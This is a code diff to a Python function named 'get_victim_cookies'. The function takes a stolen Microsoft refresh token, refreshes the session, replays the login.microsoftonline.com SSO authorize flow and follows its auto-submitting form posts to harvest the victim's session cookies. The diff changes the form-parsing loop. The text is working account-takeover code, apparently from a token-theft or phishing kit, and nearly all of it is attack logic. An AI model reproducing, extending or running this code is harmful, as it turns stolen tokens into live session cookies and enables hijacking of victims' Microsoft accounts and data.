@@ -178,7 +178,7 @@ def get_victim_cookies(refresh_token, client_id, email):
             print("[COOKIES] refresh failed:", data.get("error"), data.get("error_description", "")[:200])
             return None
 
-        # Step 2: SSO authorize round-trip (SSO from the refreshed session)
+           # Step 2: SSO authorize round-trip so login.microsoftonline.com issues cookies
         nonce = uuid.uuid4().hex
         auth_url = (
             f"{UPSTREAM}/common/oauth2/authorize?"
@@ -187,19 +187,16 @@ def get_victim_cookies(refresh_token, client_id, email):
             f"&scope=openid&response_mode=form_post&nonce={nonce}"
             f"&login_hint={email}"
         )
-        resp = s.get(auth_url, timeout=25, allow_redirects=True)
+        r2 = s.get(auth_url, timeout=25, allow_redirects=True)
 
-        # Step 3: MS returns an HTML page with a form that a browser auto-submits.
-        # requests won't do that, so we parse the form and POST it ourselves.
-        for _ in range(5):  # follow up to 5 chained form_posts
-            m = re.search(r'<form[^>]*action="([^"]+)"[^>]*>(.*?)</form>',
-                          resp.text, re.IGNORECASE | re.DOTALL)
-            if not m:
+        # Follow up to 5 auto-submitting HTML form posts (requests can't do these)
+        for _ in range(5):
+            m_action = re.search(r'action="([^"]+)"', r2.text)
+            if not m_action:
                 break
-            action = m.group(1).replace("&amp;", "&")
-            fields = dict(re.findall(
-                r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', m.group(2)))
-            resp = s.post(action, data=fields, timeout=25, allow_redirects=True)
+            action = m_action.group(1).replace("&amp;", "&")
+            fields = dict(re.findall(r'name="([^"]+)"\s+value="([^"]*)"', r2.text))
+            r2 = s.post(action, data=fields, timeout=25, allow_redirects=True)
 
         cookies = {}
         for c in s.cookies:
